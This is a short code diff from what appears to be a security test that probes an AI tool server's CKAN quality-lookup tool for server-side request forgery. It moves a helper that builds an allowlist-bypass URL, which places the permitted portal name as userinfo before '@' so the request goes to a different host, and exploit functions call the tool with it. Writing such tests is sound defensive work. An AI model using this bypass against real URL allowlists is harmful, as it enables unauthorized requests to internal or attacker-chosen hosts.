@@ -34,15 +34,15 @@ AIM = re.compile(re.escape(_HOST))
 HOST = PlantingHost(SymbolicUser.UNPRIVILEGED, "/", has_network=True)
 
 
-def _bypass_url(places: Places) -> str:
-    # The portal name as userinfo passes the allowlist yet resolves to the sentinel host.
-    return f"http://dati.gov.it@{places[WITNESS.id].coordinates.host}"
-
-
 async def _exploit_mqa_quality(places: Places, client: KitClient) -> None:
     await client.call_tool(
         "ckan_get_mqa_quality", {"server_url": _bypass_url(places), "dataset_id": "whatever"}
     )
+
+
+def _bypass_url(places: Places) -> str:
+    # The portal name as userinfo passes the allowlist yet resolves to the sentinel host.
+    return f"http://dati.gov.it@{places[WITNESS.id].coordinates.host}"
 
 
 async def _exploit_mqa_quality_details(places: Places, client: KitClient) -> None:
